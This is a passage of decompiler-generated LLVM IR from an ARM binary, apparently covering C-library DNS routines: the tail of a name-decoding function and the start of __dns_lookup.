  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_18818 = load i32, i32* @r5, align 4
  %v0_1881c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1881c, i32* %sl.global-to-local, align 4
  %v2_1881c = icmp eq i32 %v0_1881c, 0
  br i1 %v2_1881c, label %.thread30, label %dec_label_pc_18844.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18904

dec_label_pc_18844.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_188444 = load i32, i32* @r1, align 4
  %v6_1884814 = icmp slt i32 %v0_188444, %arg2
  br i1 %v6_1884814, label %dec_label_pc_1884c.preheader, label %dec_label_pc_18904

dec_label_pc_1884c.preheader:                     ; preds = %dec_label_pc_18844.preheader
  %v2_1884c51 = add i32 %v0_1881c, %v0_188444
  %v3_1884c52 = inttoptr i32 %v2_1884c51 to i8*
  %v4_1884c53 = load i8, i8* %v3_1884c52, align 1
  %v6_1884c54 = zext i8 %v4_1884c53 to i32
  store i32 %v6_1884c54, i32* @r4, align 4
  %v2_1885055 = icmp eq i8 %v4_1884c53, 0
  br i1 %v2_1885055, label %bb49, label %dec_label_pc_18858

dec_label_pc_18840:                               ; preds = %bb48, %bb44
  %v1_18844 = phi i32 [ %v1_18844.pre, %bb48 ], [ %v1_1887059, %bb44 ]
  %v0_18844 = phi i32 [ %v0_18844.pre, %bb48 ], [ %v5_18888, %bb44 ]
  %v0_18840 = phi i32 [ %v0_18840.pre, %bb48 ], [ %v0_1888c60, %bb44 ]
  store i32 %v0_18840, i32* %r0.global-to-local, align 4
  %v6_18848 = icmp slt i32 %v0_18844, %v1_18844
  br i1 %v6_18848, label %dec_label_pc_18840.dec_label_pc_1884c_crit_edge, label %dec_label_pc_18904

dec_label_pc_18840.dec_label_pc_1884c_crit_edge:  ; preds = %dec_label_pc_18840
  %v0_1884c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1884c = add i32 %v0_1884c.pre, %v0_18844
  %v3_1884c = inttoptr i32 %v2_1884c to i8*
  %v4_1884c = load i8, i8* %v3_1884c, align 1
  %v6_1884c = zext i8 %v4_1884c to i32
  store i32 %v6_1884c, i32* @r4, align 4
  %v2_18850 = icmp eq i8 %v4_1884c, 0
  %v0_188f0 = load i32, i32* @ip, align 4
  %v2_188f0 = icmp eq i32 %v0_188f0, 0
  br i1 %v2_18850, label %dec_label_pc_188f0, label %dec_label_pc_18858

dec_label_pc_18858:                               ; preds = %dec_label_pc_1884c.preheader, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge
  %v2_188f066 = phi i1 [ %v2_188f0, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge ], [ false, %dec_label_pc_1884c.preheader ]
  %v0_188f064 = phi i32 [ %v0_188f0, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge ], [ 1, %dec_label_pc_1884c.preheader ]
  %v6_1884c63 = phi i32 [ %v6_1884c, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge ], [ %v6_1884c54, %dec_label_pc_1884c.preheader ]
  %v0_1887862 = phi i32 [ %v0_1884c.pre, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge ], [ %v0_1881c, %dec_label_pc_1884c.preheader ]
  %v0_1886861 = phi i32 [ %v0_18844, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge ], [ %v0_188444, %dec_label_pc_1884c.preheader ]
  %v0_1888c60 = phi i32 [ %v0_18840, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge ], [ 0, %dec_label_pc_1884c.preheader ]
  %v1_1887059 = phi i32 [ %v1_18844, %dec_label_pc_18840.dec_label_pc_1884c_crit_edge ], [ %arg2, %dec_label_pc_1884c.preheader ]
  %v1_1885c = and i32 %v6_1884c63, 192
  br i1 %v2_188f066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_18858
  %v1_18860 = load i32, i32* %r8.global-to-local, align 4
  %v2_18860 = add i32 %v1_18860, 1
  store i32 %v2_18860, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_18858, %bb
  %v2_18864 = icmp eq i32 %v1_1885c, 192
  %v1_18868 = add i32 %v0_1886861, 1
  store i32 %v1_18868, i32* %r1.global-to-local, align 4
  br i1 %v2_18864, label %dec_label_pc_18870, label %dec_label_pc_18898

dec_label_pc_18870:                               ; preds = %bb42
  %v6_18874 = icmp slt i32 %v1_18868, %v1_1887059
  br i1 %v6_18874, label %dec_label_pc_18878, label %dec_label_pc_18904

dec_label_pc_18878:                               ; preds = %dec_label_pc_18870
  %v2_18878 = add i32 %v1_18868, %v0_1887862
  %v3_18878 = inttoptr i32 %v2_18878 to i8*
  %v4_18878 = load i8, i8* %v3_18878, align 1
  %v6_18878 = zext i8 %v4_18878 to i32
  %v1_18880 = urem i32 %v6_1884c63, 64
  br i1 %v2_188f066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_18878
  %v1_18884 = load i32, i32* %r8.global-to-local, align 4
  %v2_18884 = add i32 %v1_18884, 1
  store i32 %v2_18884, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_18878, %bb43
  %v4_18888 = mul nuw nsw i32 %v1_18880, 256
  %v5_18888 = or i32 %v6_18878, %v4_18888
  store i32 %v5_18888, i32* %r1.global-to-local, align 4
  store i32 %v0_1888c60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_18840

dec_label_pc_18898:                               ; preds = %bb42
  %v2_18898 = add i32 %v6_1884c63, %v0_1888c60
  store i32 %v2_18898, i32* %r6.global-to-local, align 4
  %v3_1889c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1889c, i32* @r3, align 4
  %v1_188a0 = add i32 %v2_18898, 1
  store i32 %v1_188a0, i32* %r7.global-to-local, align 4
  %v3_188a4 = icmp ult i32 %v1_188a0, %v3_1889c
  br i1 %v3_188a4, label %dec_label_pc_188ac, label %dec_label_pc_18904

dec_label_pc_188ac:                               ; preds = %dec_label_pc_18898
  %v2_188ac = add i32 %v6_1884c63, %v1_18868
  store i32 %v2_188ac, i32* @r5, align 4
  %v3_188b0 = icmp ult i32 %v2_188ac, %v1_1887059
  br i1 %v3_188b0, label %dec_label_pc_188b8, label %dec_label_pc_18904

dec_label_pc_188b8:                               ; preds = %dec_label_pc_188ac
  %v2_188b8 = add i32 %v1_18868, %v0_1887862
  store i32 %v2_188b8, i32* @r1, align 4
  %v0_188bc = load i32, i32* %sb.global-to-local, align 4
  %v2_188bc = add i32 %v0_188bc, %v0_1888c60
  store i32 %v2_188bc, i32* @r0, align 4
  store i32 %v6_1884c63, i32* @r2, align 4
  %v0_188c8 = call i32 @memcpy()
  store i32 %v0_188c8, i32* %r0.global-to-local, align 4
  store i32 %v0_188f064, i32* @ip, align 4
  %v0_188d0 = load i32, i32* %sl.global-to-local, align 4
  %v1_188d0 = load i32, i32* @r5, align 4
  %v2_188d0 = add i32 %v1_188d0, %v0_188d0
  %v3_188d0 = inttoptr i32 %v2_188d0 to i8*
  %v4_188d0 = load i8, i8* %v3_188d0, align 1
  br i1 %v2_188f066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_188b8
  %v1_188d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_188d8 = load i32, i32* @r4, align 4
  %v3_188d8 = add i32 %v2_188d8, %v1_188d8
  store i32 %v3_188d8, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_188b8, %bb45
  %v2_188dc = icmp eq i8 %v4_188d0, 0
  br i1 %v2_188dc, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_188e8.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_188d0, i32* %r1.global-to-local, align 4
  %v2_188e8 = load i32, i32* %sb.global-to-local, align 4
  %v3_188e8 = load i32, i32* %r6.global-to-local, align 4
  %v4_188e8 = add i32 %v3_188e8, %v2_188e8
  %v5_188e8 = inttoptr i32 %v4_188e8 to i8*
  store i8 %v0_188e8.off0, i8* %v5_188e8, align 1
  %v0_18840.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_18844.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_18844.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_18840

dec_label_pc_188f0:                               ; preds = %dec_label_pc_18840.dec_label_pc_1884c_crit_edge
  %v0_188f8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_188f0, label %dec_label_pc_18904, label %bb49

bb49:                                             ; preds = %dec_label_pc_1884c.preheader, %dec_label_pc_188f0
  %v0_188f8.pre69 = phi i32 [ %v0_188f8.pre.pre, %dec_label_pc_188f0 ], [ 0, %dec_label_pc_1884c.preheader ]
  %v2_188f4 = add i32 %v0_188f8.pre69, 1
  store i32 %v2_188f4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18904

dec_label_pc_18904:                               ; preds = %dec_label_pc_188ac, %dec_label_pc_18898, %dec_label_pc_18870, %dec_label_pc_18840, %dec_label_pc_188f0, %dec_label_pc_18844.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_188f4, %bb49 ], [ -1, %dec_label_pc_18844.preheader ], [ %v0_188f8.pre.pre, %dec_label_pc_188f0 ], [ -1, %dec_label_pc_18898 ], [ -1, %dec_label_pc_188ac ], [ -1, %dec_label_pc_18840 ], [ -1, %dec_label_pc_18870 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_18818, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_188f8.pre.pre, { 1, 0 }
  uselistorder i32 %v1_188d0, { 1, 0 }
  uselistorder i32 %v5_18888, { 1, 0 }
  uselistorder i32 %v1_18868, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1888c60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1884c63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_188f066, { 1, 2, 0 }
  uselistorder i32 %v0_1881c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_18904, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_18858, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_18910 = load i32, i32* @r4, align 4
  %v6_18910 = load i32, i32* @r5, align 4
  %v9_18910 = load i32, i32* @r6, align 4
  %v12_18910 = load i32, i32* @r7, align 4
  %v15_18910 = load i32, i32* @r8, align 4
  %v18_18910 = load i32, i32* @sb, align 4
  %v21_18910 = load i32, i32* @sl, align 4
  %v24_18910 = load i32, i32* @fp, align 4
  %v27_18910 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_18924 = load i32, i32* %r1.global-to-local, align 4
  %v1_1892c = call i32 @malloc(i32 512)
  store i32 %v1_1892c, i32* @sl, align 4
  %v0_18934 = load i32, i32* @r4, align 4
  %v1_18934 = inttoptr i32 %v0_18934 to i8*
  %v3_18938 = call i32 @strlen(i8* %v1_18934)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_18944 = icmp ugt i32 %v3_18938, 893
  store i1 %v3_18944, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_18938, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_18964

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19074

dec_label_pc_18964:                               ; preds = %entry
  %v1_18968 = add i32 %v3_18938, 130
  %v1_1896c = call i32 @malloc(i32 %v1_18968)
  store i32 %v1_1896c, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18970 = icmp eq i32 %v1_1896c, 0
  br i1 %v2_18970, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_18964
  %v1_18974 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_18974 = icmp eq i32 %v1_18974, 0
  br i1 %v3_18974, label %bb213, label %dec_label_pc_18988

.thread5:                                         ; preds = %dec_label_pc_18964
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1906c

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1906c

dec_label_pc_18988:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_18988 = load i32, i32* @r4, align 4
  %v1_18988 = inttoptr i32 %v0_18988 to i8*
  %v2_18988 = load i8, i8* %v1_18988, align 1
  %v3_18988 = zext i8 %v2_18988 to i32
  store i32 %v3_18988, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1898c = icmp eq i8 %v2_18988, 0
  br i1 %v2_1898c, label %dec_label_pc_1906c, label %dec_label_pc_18994

dec_label_pc_18994:                               ; preds = %dec_label_pc_18988
  %v2_18998 = add i32 %v0_18988, %v3_18938
  store i32 %v2_18998, i32* %r3.global-to-local, align 4
  %v1_1899c = add i32 %v2_18998, -1
  %v2_1899c = inttoptr i32 %v1_1899c to i8*
  %v3_1899c = load i8, i8* %v2_1899c, align 1
  %v4_1899c = zext i8 %v3_1899c to i32
  store i32 %v4_1899c, i32* @r3, align 4
  store i32 %v3_18938, i32* @r2, align 4
  store i32 %v0_18988, i32* @r1, align 4
  %v0_189ac = call i32 @memcpy()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 27352, i32* %ip.global-to-local, align 4
  store i32 26316, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_18a28 = ptrtoint i32* %stack_var_-76 to i32
  %v2_18b40 = ptrtoint i16* %stack_var_-104 to i32
  %v15_18b44 = ptrtoint i32* %stack_var_-88 to i32
  %v2_18b68 = ptrtoint i32* %stack_var_-192 to i32
  %v2_18b88 = bitcast i32* %stack_var_-192 to i8*
  %v2_18c3c = ptrtoint i32* %stack_var_-48 to i32
  %v2_18c48 = ptrtoint i32* %stack_var_-56 to i32
  %v2_18cd4 = icmp eq i32 %tmp161, 0
  %v1_18ce0 = add i32 %tmp160, -2
  %v2_18ce4 = icmp ne i32 %v1_18ce0, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_18dd0 = ptrtoint i32* %stack_var_-448 to i32
  %v2_18dd4 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1901856 = icmp sgt i32 %tmp159, 0
  %v2_18f40 = icmp ne i32 %v0_18924, 0
  %v7_18f40 = icmp eq i32 %v0_18924, 1
  %v1_18e34 = bitcast i32* %stack_var_-448 to i8*
  %v2_18ee8 = icmp eq i32 %tmp144, 0
  %v2_18cf0 = icmp ugt i8 %v3_1899c, 45
  %v7_18cf0 = icmp eq i8 %v3_1899c, 46
  %v1_18a9c = add i32 %v1_1896c, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_18a7c = add i32 %v1_1896c, %v3_18938
  %v5_18a7c = inttoptr i32 %v4_18a7c to i8*
  %v1_18ce0.cmp = icmp ugt i32 %v1_18ce0, 1
  %v2_18d18 = icmp eq i32 %tmp160, 0
  %v3_18f44 = icmp ugt i32 %v0_18924, 27
  %v8_18f44 = icmp eq i32 %v0_18924, 28
  br label %dec_label_pc_18a0c

dec_label_pc_18a0c:                               ; preds = %dec_label_pc_19054, %dec_label_pc_18994
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_18994 ], [ %v1_19058, %dec_label_pc_19054 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_18994 ], [ %v3_18b20, %dec_label_pc_19054 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_18994 ], [ %stack_var_-468.2, %dec_label_pc_19054 ]
  %v1_18a14 = phi i32 [ -1, %dec_label_pc_18994 ], [ %v3_18bf4, %dec_label_pc_19054 ]
  store i32 %v1_18a14, i32* %r3.global-to-local, align 4
  %v2_18a10 = icmp eq i32 %v1_18a14, -1
  store i1 %v2_18a10, i1* %cpsr_c.global-to-local, align 1
  %v7_18a10 = icmp eq i32 %v1_18a14, -1
  br i1 %v7_18a10, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_18a0c
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_18a0c, %bb215
  %v1_18a18 = xor i1 %v7_18a10, true
  call void @__pseudo_cond_branch(i1 %v1_18a18, i32 ptrtoint (i32* @global_var_fa44.650 to i32))
  store i32 36, i32* @r7, align 4
  %v0_18a24 = load i32, i32* @r8, align 4
  %v2_18a24 = add i32 %v0_18a24, 40
  %v3_18a24 = inttoptr i32 %v2_18a24 to i32*
  %v4_18a24 = load i32, i32* %v3_18a24, align 4
  store i32 %v4_18a24, i32* @r4, align 4
  store i32 %v2_18a28, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_18a34 = add i32 %v0_18a24, 36
  %v3_18a34 = inttoptr i32 %v2_18a34 to i32*
  %v4_18a34 = load i32, i32* %v3_18a34, align 4
  store i32 %v4_18a34, i32* %r1.global-to-local, align 4
  %v2_18a3c = add i32 %v0_18a24, 76
  %v3_18a3c = inttoptr i32 %v2_18a3c to i32*
  %v4_18a3c = load i32, i32* %v3_18a3c, align 4
  store i32 %v4_18a3c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18a3c)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_18a50 = load i32, i32* @r8, align 4
  %v2_18a50 = add i32 %v0_18a50, 16
  %v3_18a50 = inttoptr i32 %v2_18a50 to i32*
  %v4_18a50 = load i32, i32* %v3_18a50, align 4
  store i32 %v4_18a50, i32* %ip.global-to-local, align 4
  store i32 100956, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18a50)
  %v0_18a5c = call i32 @__open_nameservers()
  %v0_18a64 = load i32, i32* @r8, align 4
  %v2_18a64 = add i32 %v0_18a64, 27364
  %v3_18a64 = inttoptr i32 %v2_18a64 to i32*
  %v4_18a64 = load i32, i32* %v3_18a64, align 4
  store i32 %v1_1896c, i32* %r3.global-to-local, align 4
  store i32 %v3_18938, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_18a74 = load i32, i32* @sb, align 4
  %v3_18a74 = icmp uge i32 %v0_18a74, %v4_18a64
  store i1 %v3_18a74, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_18a7c, align 1
  %v0_18a80 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18a80, label %dec_label_pc_18aac, label %dec_label_pc_18a84

dec_label_pc_18a84:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_18a8c = load i32, i32* %ip.global-to-local, align 4
  %v4_18a8c = add i32 %v3_18a8c, %v1_1896c
  %v5_18a8c = inttoptr i32 %v4_18a8c to i8*
  store i8 46, i8* %v5_18a8c, align 1
  store i32 27352, i32* %r1.global-to-local, align 4
  %v0_18a98 = load i32, i32* @r8, align 4
  %v2_18a98 = add i32 %v0_18a98, 27352
  %v3_18a98 = inttoptr i32 %v2_18a98 to i32*
  %v4_18a98 = load i32, i32* %v3_18a98, align 4
  store i32 %v4_18a98, i32* %r3.global-to-local, align 4
  %v1_18aa0 = load i32, i32* %ip.global-to-local, align 4
  %v2_18aa0 = add i32 %v1_18a9c, %v1_18aa0
  %v1_18aa4 = load i32, i32* @sb, align 4
  %v2_18aa4 = and i32 %v1_18aa4, 1073741824
  %v3_18aa4 = icmp ne i32 %v2_18aa4, 0
  store i1 %v3_18aa4, i1* %cpsr_c.global-to-local, align 1
  %v4_18aa4 = mul i32 %v1_18aa4, 4
  %v5_18aa4 = add i32 %v4_18aa4, %v4_18a98
  %v6_18aa4 = inttoptr i32 %v5_18aa4 to i32*
  %v7_18aa4 = load i32, i32* %v6_18aa4, align 4
  store i32 %v7_18aa4, i32* @r1, align 4
  %v2_18aa8 = inttoptr i32 %v2_18aa0 to i8*
  %v3_18aa8 = call i32 @strcpy(i8* %v2_18aa8, i32 %v7_18aa4)
  br label %dec_label_pc_18aac

dec_label_pc_18aac:                               ; preds = %bb216, %dec_label_pc_18a84
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18ab0 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_18ab0, label %dec_label_pc_18ab8, label %dec_label_pc_18aac.dec_label_pc_18ae8_crit_edge

dec_label_pc_18aac.dec_label_pc_18ae8_crit_edge:  ; preds = %dec_label_pc_18aac
  %v0_18af0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_18ae8

dec_label_pc_18ab8:                               ; preds = %dec_label_pc_18aac
  store i32 27360, i32* %r3.global-to-local, align 4
  store i32 1123, i32* %ip.global-to-local, align 4
  %v0_18ac0 = load i32, i32* @r8, align 4
  %v2_18ac0 = add i32 %v0_18ac0, 27360
  %v3_18ac0 = inttoptr i32 %v2_18ac0 to i32*
  %v4_18ac0 = load i32, i32* %v3_18ac0, align 4
  %v2_18ac4 = add i32 %v0_18ac0, 1123
  %v3_18ac4 = inttoptr i32 %v2_18ac4 to i8*
  %v4_18ac4 = load i8, i8* %v3_18ac4, align 1
  %v6_18ac4 = zext i8 %v4_18ac4 to i32
  %v2_18ac8 = mul i32 %v6_18ac4, %v4_18ac0
  store i32 %v2_18ac8, i32* %r3.global-to-local, align 4
  store i32 26316, i32* %r1.global-to-local, align 4
  %v2_18ad4 = add i32 %v0_18ac0, 1120
  %v3_18ad4 = inttoptr i32 %v2_18ad4 to i16*
  %v4_18ad4 = load i16, i16* %v3_18ad4, align 2
  %v6_18ad4 = zext i16 %v4_18ad4 to i32
  %v2_18ad8 = add i32 %v0_18ac0, 26316
  %v3_18ad8 = inttoptr i32 %v2_18ad8 to i32*
  %v4_18ad8 = load i32, i32* %v3_18ad8, align 4
  store i32 %v4_18ad8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ae8

dec_label_pc_18ae8:                               ; preds = %dec_label_pc_18aac.dec_label_pc_18ae8_crit_edge, %dec_label_pc_18ab8
  %v2_18b2c = phi i32 [ %v0_18ac0, %dec_label_pc_18ab8 ], [ %v0_18af0.pre, %dec_label_pc_18aac.dec_label_pc_18ae8_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_18ad4, %dec_label_pc_18ab8 ], [ %stack_var_-464.0, %dec_label_pc_18aac.dec_label_pc_18ae8_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_18ad8, %dec_label_pc_18ab8 ], [ %stack_var_-468.0, %dec_label_pc_18aac.dec_label_pc_18ae8_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_18ac8, %dec_label_pc_18ab8 ], [ %stack_var_-476.0, %dec_label_pc_18aac.dec_label_pc_18ae8_crit_edge ]
  store i32 27360, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_18af0 = add i32 %v2_18b2c, 27360
  %v3_18af0 = inttoptr i32 %v2_18af0 to i32*
  %v4_18af0 = load i32, i32* %v3_18af0, align 4
  store i32 27356, i32* %r3.global-to-local, align 4
  %v3_18af8 = icmp uge i32 %stack_var_-468.1, %v4_18af0
  store i1 %v3_18af8, i1* %cpsr_c.global-to-local, align 1
  %v2_18afc = add i32 %v2_18b2c, 27356
  %v3_18afc = inttoptr i32 %v2_18afc to i32*
  %v4_18afc = load i32, i32* %v3_18afc, align 4
  store i32 %v4_18afc, i32* %r3.global-to-local, align 4
  br i1 %v3_18af8, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_18ae8
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_18ae8, %bb217
  %v0_18b08 = phi i32 [ %stack_var_-468.1, %dec_label_pc_18ae8 ], [ 0, %bb217 ]
  %v3_18b08 = mul i32 %v0_18b08, 28
  %v4_18b08 = add i32 %v3_18b08, %v4_18afc
  store i32 %v4_18b08, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_18b14 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_18b20 = urem i32 %v1_18b14, 65536
  store i32 26316, i32* %r1.global-to-local, align 4
  %v1_18b2c = trunc i32 %v1_18b14 to i16
  %v4_18b2c = add i32 %v2_18b2c, 1120
  %v5_18b2c = inttoptr i32 %v4_18b2c to i16*
  store i16 %v1_18b2c, i16* %v5_18b2c, align 2
  %v1_18b34 = load i32, i32* @r8, align 4
  %v2_18b34 = load i32, i32* %r1.global-to-local, align 4
  %v3_18b34 = add i32 %v2_18b34, %v1_18b34
  %v4_18b34 = inttoptr i32 %v3_18b34 to i32*
  store i32 %v0_18b08, i32* %v4_18b34, align 4
  %v0_18b38 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b3c = inttoptr i32 %v0_18b38 to i32*
  %v2_18b3c = load i32, i32* %v1_18b3c, align 4
  %v3_18b3c = add i32 %v0_18b38, 4
  %v4_18b3c = inttoptr i32 %v3_18b3c to i32*
  %v5_18b3c = load i32, i32* %v4_18b3c, align 4
  store i32 %v5_18b3c, i32* %r1.global-to-local, align 4
  %v9_18b3c = add i32 %v0_18b38, 12
  %v10_18b3c = inttoptr i32 %v9_18b3c to i32*
  %v11_18b3c = load i32, i32* %v10_18b3c, align 4
  store i32 %v11_18b3c, i32* %r3.global-to-local, align 4
  %v12_18b3c = add i32 %v0_18b38, 16
  %v4_18b44 = trunc i32 %v2_18b3c to i16
  store i16 %v4_18b44, i16* %stack_var_-104, align 2
  store i32 %v15_18b44, i32* %ip.global-to-local, align 4
  %v1_18b48 = inttoptr i32 %v12_18b3c to i32*
  %v2_18b48 = load i32, i32* %v1_18b48, align 4
  %v3_18b48 = add i32 %v0_18b38, 20
  %v4_18b48 = inttoptr i32 %v3_18b48 to i32*
  %v5_18b48 = load i32, i32* %v4_18b48, align 4
  store i32 %v5_18b48, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_18b48, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_18b5c = load i32, i32* @r8, align 4
  %v2_18b5c = add i32 %v0_18b5c, 24
  %v3_18b5c = inttoptr i32 %v2_18b5c to i32*
  %v4_18b5c = load i32, i32* %v3_18b5c, align 4
  store i32 %v4_18b5c, i32* %ip.global-to-local, align 4
  store i32 101224, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18b5c)
  store i32 %v2_18b68, i32* @r6, align 4
  %v0_18b6c = load i32, i32* @r7, align 4
  store i32 %v0_18b6c, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_18b74 = load i32, i32* @sl, align 4
  %v2_18b78 = inttoptr i32 %v0_18b74 to i8*
  %v3_18b78 = call i32 @__GI_memset(i8* %v2_18b78, i32 %v0_18b6c)
  %v0_18b7c = load i32, i32* @r7, align 4
  store i32 %v0_18b7c, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_18b88 = call i32 @__GI_memset(i8* %v2_18b88, i32 %v0_18b7c)
